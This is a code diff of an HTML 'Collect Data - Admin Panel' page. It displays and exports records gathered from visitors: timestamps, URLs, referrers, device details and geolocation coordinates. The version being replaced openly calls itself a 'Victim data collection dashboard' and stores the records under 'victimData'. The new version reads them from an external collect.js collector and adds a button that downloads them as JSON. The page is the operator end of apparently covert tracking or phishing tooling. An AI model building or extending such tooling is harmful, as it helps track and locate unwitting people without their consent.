@@ -6,10 +6,10 @@
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
-            background: #f9f9f9;
+            background: #f5f5f5;
         }
         .container {
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 0 auto;
             background: white;
             padding: 20px;
@@ -17,95 +17,125 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         h1 { color: #333; }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
+        .controls {
+            margin: 20px 0;
+            padding: 15px;
+            background: #e9ecef;
+            border-radius: 5px;
         }
-        th, td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #ddd;
+        button {
+            padding: 10px 15px;
+            margin: 5px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
         }
-        th {
-            background-color: #f2f2f2;
-            font-weight: bold;
+        button:hover {
+            background: #0056b3;
         }
-        tr:hover {
-            background-color: #f5f5f5;
+        .data-item {
+            border: 1px solid #ddd;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 5px;
+            background: #f8f9fa;
+        }
+        .data-item h3 {
+            margin-top: 0;
+            color: #007bff;
+        }
+        .data-item pre {
+            background: #f1f1f1;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
         }
         .no-data {
             text-align: center;
             color: #666;
             font-style: italic;
+            padding: 20px;
         }
-        button {
-            padding: 10px 20px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-        button:hover {
-            background: #45a049;
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Collect Data - Admin Panel</h1>
-        <p>Victim data collection dashboard</p>
 
-        <button onclick="loadData()">Refresh Data</button>
-        <button onclick="clearData()">Clear All Data</button>
+        <div class="controls">
+            <button onclick="loadData()">Refresh Data</button>
+            <button onclick="clearData()">Clear All Data</button>
+            <button onclick="downloadData()">Download Data</button>
+        </div>
 
-        <div id="data-container">
-            <p class="no-data">No data collected yet</p>
+        <div id="dataContainer">
+            <div class="no-data">No data collected yet. Click "Refresh Data" to load collected data.</div>
         </div>
     </div>
 
+    <script src="collect.js"></script>
     <script>
-        // Load data from localStorage
+        // Load and display collected data
         function loadData() {
-            const data = JSON.parse(localStorage.getItem('victimData') || '[]');
-            const container = document.getElementById('data-container');
+            const data = collector.getAllData();
+            const container = document.getElementById('dataContainer');
 
             if (data.length === 0) {
-                container.innerHTML = '<p class="no-data">No data collected yet</p>';
+                container.innerHTML = '<div class="no-data">No data collected yet.</div>';
                 return;
             }
 
-            let html = '<table><tr><th>Date</th><th>Location</th><th>Device</th><th>URL</th></tr>';
-
-            data.forEach(item => {
-                const date = new Date(item.timestamp).toLocaleString();
-                const location = item.location ?
-                    `Lat: ${item.location.latitude.toFixed(4)}, Lng: ${item.location.longitude.toFixed(4)}` :
-                    'N/A';
-
-                html += `<tr>
-                    <td>${date}</td>
-                    <td>${location}</td>
-                    <td>${item.device.userAgent.substring(0, 50)}...</td>
-                    <td>${item.url.substring(0, 30)}...</td>
-                </tr>`;
+            let html = '';
+            data.forEach((item, index) => {
+                html += `
+                    <div class="data-item">
+                        <h3>Entry #${index + 1}</h3>
+                        <div class="timestamp">Timestamp: ${new Date(item.timestamp).toLocaleString()}</div>
+                        <div><strong>URL:</strong> ${item.url}</div>
+                        <div><strong>Referrer:</strong> ${item.referrer || 'None'}</div>
+                        <h4>Device Info:</h4>
+                        <pre>${JSON.stringify(item.device, null, 2)}</pre>
+                        ${item.location ? `
+                            <h4>Location:</h4>
+                            <pre>${JSON.stringify(item.location, null, 2)}</pre>
+                        ` : ''}
+                    </div>
+                `;
             });
 
-            html += '</table>';
             container.innerHTML = html;
         }
 
         // Clear all data
         function clearData() {
             if (confirm('Are you sure you want to clear all collected data?')) {
-                localStorage.removeItem('victimData');
+                collector.clearData();
                 loadData();
             }
         }
 
-        // Initialize
+        // Download data as JSON file
+        function downloadData() {
+            const data = collector.getAllData();
+            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'collected-data.json';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Load data when page loads
         window.onload = function() {
             loadData();
         };
